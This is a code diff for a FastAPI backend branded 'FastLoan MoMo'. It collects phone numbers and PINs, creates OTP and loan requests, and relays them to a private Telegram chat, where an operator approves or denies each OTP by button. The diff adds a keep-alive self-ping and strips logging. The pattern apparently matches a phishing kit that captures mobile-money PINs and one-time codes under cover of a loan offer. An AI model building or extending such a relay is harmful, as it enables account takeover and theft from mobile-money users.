@@ -1,10 +1,11 @@
 import os
 import uuid
+import asyncio
+import httpx
 from dotenv import load_dotenv
 from fastapi import FastAPI, HTTPException, Request, Header
 from pydantic import BaseModel, Field
 from fastapi.middleware.cors import CORSMiddleware
-import httpx
 
 load_dotenv()
 
@@ -21,10 +22,43 @@ app.add_middleware(
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# In-memory databases
 LOAN_REQUESTS = {}
 OTP_REQUESTS = {}
 
+# --- KEEP-ALIVE BACKGROUND TASK ---
+async def self_ping():
+    """Pings the server's own URL every 14 minutes to prevent Render from sleeping."""
+    # Render provides this environment variable automatically
+    render_url = os.getenv("RENDER_EXTERNAL_URL")
+    
+    if not render_url:
+        print("⚠️ RENDER_EXTERNAL_URL not set. Keep-alive disabled.")
+        return
+
+    ping_url = f"{render_url}/"
+    print(f"🔄 Keep-alive started. Pinging {ping_url} every 14 minutes.")
+
+    # Initial wait to allow the server to fully start
+    await asyncio.sleep(10)
+
+    while True:
+        try:
+            async with httpx.AsyncClient() as client:
+                await client.get(ping_url, timeout=10.0)
+            print("✅ Keep-alive ping sent.")
+        except Exception as e:
+            print(f"❌ Keep-alive ping failed: {e}")
+        
+        # Wait 14 minutes (840 seconds) before pinging again
+        await asyncio.sleep(14 * 60)
+
+@app.on_event("startup")
+async def startup_event():
+    """Starts the background keep-alive task when the server starts."""
+    asyncio.create_task(self_ping())
+# ---------------------------------
+
+# --- DATA MODELS ---
 class LoginRequest(BaseModel):
     phone_number: str
     pin: str
@@ -38,9 +72,11 @@ class LoanRequest(BaseModel):
     amount: float = Field(..., gt=0)
     months: int = Field(..., gt=0)
 
+# --- ENDPOINTS ---
+
 @app.get("/")
 async def root():
-    return {"status": "success", "message": "Backend is running!"}
+    return {"status": "success", "message": "FastLoan MoMo Backend is running!"}
 
 @app.post("/api/login")
 async def login(data: LoginRequest):
@@ -55,7 +91,6 @@ async def login(data: LoginRequest):
 async def verify_otp(data: OTPRequest):
     otp_id = str(uuid.uuid4())
     OTP_REQUESTS[otp_id] = "pending"
-    print(f"🟢 Created OTP Request: {otp_id}")
 
     if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -88,6 +123,35 @@ async def get_otp_status(otp_id: str):
         raise HTTPException(status_code=404, detail="OTP not found")
     return {"status": OTP_REQUESTS[otp_id]}
 
+@app.post("/api/apply-loan")
+async def apply_loan(data: LoanRequest):
+    loan_id = str(uuid.uuid4())
+    LOAN_REQUESTS[loan_id] = "pending"
+
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": (
+                f"💰 <b>New Loan Application</b>\n\n"
+                f"📱 Phone: {data.phone_number}\n"
+                f"💵 Amount: {data.amount:,.0f} FCFA\n"
+                f"📅 Months: {data.months}\n"
+                f"🆔 Loan ID: <code>{loan_id}</code>"
+            ),
+            "parse_mode": "HTML"
+        }
+        async with httpx.AsyncClient() as client:
+            await client.post(url, json=payload, timeout=10.0)
+
+    return {"status": "pending", "loan_id": loan_id}
+
+@app.get("/api/loan-status/{loan_id}")
+async def get_loan_status(loan_id: str):
+    if loan_id not in LOAN_REQUESTS:
+        raise HTTPException(status_code=404, detail="Loan not found")
+    return {"status": LOAN_REQUESTS[loan_id]}
+
 async def send_telegram_message(message: str):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return
@@ -96,13 +160,11 @@ async def send_telegram_message(message: str):
     async with httpx.AsyncClient() as client:
         await client.post(url, json=payload)
 
-# --- TELEGRAM WEBHOOK (NO SECRET TOKEN FOR EASIER TESTING) ---
+# --- TELEGRAM WEBHOOK ---
 @app.post("/api/telegram-webhook")
 async def telegram_webhook(request: Request):
     try:
         data = await request.json()
-        print(f"🔵 Webhook received data!")
-
         if "callback_query" in data:
             callback = data["callback_query"]
             callback_id = callback.get("id")
@@ -112,7 +174,6 @@ async def telegram_webhook(request: Request):
             original_text = message.get("text", "")
             
             action_data = callback.get("data", "")
-            print(f"🔵 Button clicked: {action_data}")
             
             try:
                 action, item_type, item_id = action_data.split("_", 2)
@@ -122,7 +183,6 @@ async def telegram_webhook(request: Request):
             if item_type == "otp" and item_id in OTP_REQUESTS:
                 OTP_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                 reply_text = "✅ OTP Approved" if action == "approve" else "❌ OTP Denied"
-                print(f"🟢 OTP {item_id} marked as {OTP_REQUESTS[item_id]}")
                 
                 async with httpx.AsyncClient() as client:
                     await client.post(
@@ -138,8 +198,6 @@ async def telegram_webhook(request: Request):
                             "parse_mode": "HTML"
                         }
                     )
-
     except Exception as e:
         print(f"❌ Webhook error: {e}")
-        
     return {"status": "ok"}
